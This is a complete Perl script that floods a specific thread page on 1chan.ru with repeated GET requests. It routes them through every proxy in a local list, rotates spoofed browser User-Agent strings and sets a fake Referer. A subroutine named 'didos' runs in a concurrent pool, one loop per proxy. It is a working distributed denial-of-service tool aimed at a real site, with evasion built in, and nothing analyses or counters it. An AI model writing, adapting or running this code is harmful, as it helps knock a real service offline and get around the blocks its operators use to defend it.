use 5.010;
use strict;
use warnings;
use autodie;

use LWP;

use YobaCoro;

#-------------------------------------------------

my $url        = "http://1chan.ru/news/res/2286463/";
my $proxylist  = "/home/user/prog/perl/piston/2net";
my $timeout    = 1;
my $max_errors = 10;

my $referer = "http://1chan.ru/";
my @agents  = (
   'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36',
   'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36',
   'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36',
   'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36',
   'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36',
   'Mozilla/5.0 (Windows NT 5.1; rv:23.0) Gecko/20130406 Firefox/23.0',
   'Mozilla/5.0 (Windows NT 6.0; rv:23.0) Gecko/20130406 Firefox/23.0',
   'Mozilla/5.0 (Windows NT 6.1; rv:23.0) Gecko/20130406 Firefox/23.0',
   'Mozilla/5.0 (Windows NT 6.2; rv:23.0) Gecko/20130406 Firefox/23.0',
   'Mozilla/5.0 (Windows NT 6.3; rv:23.0) Gecko/20130406 Firefox/23.0',
   'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0)',
   'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/6.0)',
   'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
   'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)',
   'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/6.0)',
   'Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.16',
   'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.16',
   'Opera/9.80 (Windows NT 6.1) Presto/2.12.388 Version/12.16',
   'Opera/9.80 (Windows NT 6.2) Presto/2.12.388 Version/12.16',
   'Opera/9.80 (Windows NT 6.3) Presto/2.12.388 Version/12.16'
);

#-------------------------------------------------

sub read_file($)
{
   my($fname) = @_;
   open my $fh, "<", $fname;
   read $fh, my $data, -s $fname;
   return $data;
}

sub parse_proxies($)
{
   my($text) = @_;
   my %tmp;
   my @proxies = grep { !$tmp{$_}++ } $text =~ m~((?:\w+://)?[a-z0-9\.]*?\.(?:.{2,3}|\d{1,3}):\d{2,4})~gm;
   my @result;
   my %ips;
   for my $proxy (@proxies)
   {
      my($ip) = $proxy =~ m~(?:\w+://)?(.*?):\d+~;
      next if length $ip < 8;
      push @result, $proxy unless $ips{$ip}++;
   }
   return map { m~^\w+://~ ? $_ : "http://$_" } @result;
}

sub read_proxylist($)
{
   my($fname) = @_;
   return parse_proxies read_file $fname;
}

#-------------------------------------------------

sub didos
{
   my($proxy) = @_;

   my $lwp = new LWP::UserAgent;
   $lwp->default_header(Referer => $referer) if length $referer;
   $lwp->agent($agents[rand @agents]) if @agents;
   $lwp->proxy(["http", "https"], $proxy);

   my $errors = 0;
   while(1)
   {
      my $res = $lwp->get($url);
      say "$proxy: ", $res->status_line;

      $errors++ unless $res->is_success;
      last if $max_errors && $errors >= $max_errors;
      
      sleep $timeout;
   }
}

#-------------------------------------------------

my @proxies = read_proxylist $proxylist;

my $pool = pool \&didos, \@proxies, { desc => "didos", debug => 1, join => 1 };

